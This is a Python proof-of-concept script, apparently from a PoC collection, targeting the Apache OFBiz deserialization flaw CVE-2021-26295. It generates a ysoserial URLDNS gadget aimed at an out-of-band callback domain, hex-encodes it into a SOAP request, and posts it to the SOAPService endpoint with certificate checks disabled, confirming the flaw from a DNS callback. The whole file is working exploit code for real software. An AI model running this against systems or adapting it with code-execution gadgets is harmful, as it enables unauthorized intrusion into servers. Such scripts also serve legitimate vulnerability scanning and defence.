pocs/apache-ofbiz-cve-2021-26295.py

import requests
import sys
import sys
import subprocess
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)

def scan(target_url):
    gets=get_domain()
    domain=gets[0]
    token=gets[1]
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", "http://"+domain], stdout=subprocess.PIPE)
    data = popen.stdout.read()
    hex_data = trans(data)
    headers = {
        'Content-Type': 'text/xml'
    }
    post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi="http://ofbiz.apache.org/service/"><peiqi:cus-obj>%s</peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data
    vuln_url = target_url + "webtools/control/SOAPService"
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=25)
    if response.status_code == 200 and get_result(domain,token):
        return True
    else:
        return False


